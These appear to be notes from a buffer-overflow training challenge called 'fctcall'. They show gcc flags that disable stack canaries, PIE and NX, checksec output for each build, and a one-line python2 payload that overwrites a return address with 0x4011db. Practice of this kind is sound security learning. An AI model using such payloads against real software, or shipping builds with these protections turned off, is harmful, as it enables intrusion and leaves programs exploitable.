# Gcc 

```
$ checksec fctcall
[*] '/home/yolo/yolo/BufferOverflows/challs/01_fctcall/build/fctcall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

$ gcc fctcall.c -o fctcall -fno-stack-protector
yolo@yolo-vb:~/yolo/BufferOverflows/challs/01_fctcall/build$ checksec fctcall
[*] '/home/yolo/yolo/BufferOverflows/challs/01_fctcall/build/fctcall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

$ gcc fctcall.c -o fctcall -fno-stack-protector -z execstack -no-pie
yolo@yolo-vb:~/yolo/BufferOverflows/challs/01_fctcall/build$ checksec fctcall
[*] '/home/yolo/yolo/BufferOverflows/challs/01_fctcall/build/fctcall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
Too much disabled 

```
$ gcc fctcall.c -o fctcall -fno-stack-protector  -no-pie
yolo@yolo-vb:~/yolo/BufferOverflows/challs/01_fctcall/build$ checksec fctcall
[*] '/home/yolo/yolo/BufferOverflows/challs/01_fctcall/build/fctcall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
Ok for ROP



## Exploit bash & python2 

4011db

```
python2 -c 'print ("\x90"*32 + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\xdb\x11\x40\x00\x00\x00\x00\x00")' | ./fctcall
```

